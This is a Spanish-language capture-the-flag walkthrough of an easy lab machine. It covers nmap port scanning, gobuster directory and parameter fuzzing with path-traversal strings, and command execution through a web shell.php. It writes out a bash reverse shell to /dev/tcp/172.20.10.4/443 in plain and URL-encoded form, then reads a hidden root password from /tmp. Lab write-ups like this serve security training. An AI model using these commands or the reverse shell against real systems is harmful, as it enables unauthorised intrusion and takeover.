tags: #facil #LFI #fuzzing 
______
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- 172.17.0.2 -oN ports -n -Pn --min-rate 5000 --open
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251013104854.png]]


Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV -p- 172.17.0.2 -oN version -n -Pn --min-rate 5000 
```

![[Anexos/Pasted image 20251013105011.png]]

Ahora vamos a entrar al sitio web para averiguar de qué se trata:

Se trata de una web muy básica de una academia de inglés que no tiene nada interesante excepto este mensaje en la parte inferior:

![[Anexos/Pasted image 20251013105107.png]]

Ahora voy a aplicar fuzzing para encontrar directorios y archivos ocultos, usando el siguiente comando:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 10 -o dirs.txt
```

Obtenemos lo siguiente:

![[Anexos/Pasted image 20251013105735.png]]

Esto es lo que contiene el archivo warning.html:

![[Anexos/Pasted image 20251013105705.png]]

Viendo que tenemos un recurso php, vamos a intentar aplicar fuzzing, para intentar averiguar con qué parámetro puede devolverme un código de estado 200:

```bash
gobuster fuzz -u http://172.17.0.2/shell.php?FUZZ=....//....//....//....//....//....//....//tmp -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10 -xl 0  
```

![[Anexos/Pasted image 20251013110449.png]]

Hemos obtenido la palabra: **parameter**

Así que, vamos a ejecutar un Local File Inclusion (LFI) para leer archivos internos del sistema. También nos han indicado que este archivo se trata de una shell, por lo que vamos a ver si tenemos acceso directo a un Remote Code Execution (RCE):

```bash
http://172.17.0.2/shell.php?parameter=whoami
```

![[Anexos/Pasted image 20251013111013.png]]

Efectivamente, es así. Ahora con toda lógica, vamos a ejecutar una reverse shell para controlar la máquina desde nuestro host. Para eso ejecutamos el siguiente comando como parámetro de URL:

```bash
bash -c "bash -i >& /dev/tcp/172.20.10.4/443 0>&1"
```

La URL queda así: 

```
La url queda así: http://172.17.0.2/shell.php?parameter=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.20.10.4/443%200%3E%261%22
```

Al ejecutar la URL y ponernos por escucha con netcat por el puerto 443, obtenemos una reverse shell:

![[Anexos/Pasted image 20251013111552.png]]

Hacemos un tratamiento de la TTY y accedemos a la raíz. Si recordamos, en la página principal nos indicaban en la parte inferior que había algo guardado en /tmp, así que vamos a ver de qué se trata, introduciendo la siguiente URL en el navegador:

Vemos que hay un archivo oculto .secret.txt, que tras hacerle un cat vemos lo que parece ser la contraseña del usuario root. La probamos:

![[Anexos/Pasted image 20251013112106.png]]

Y somos root!!












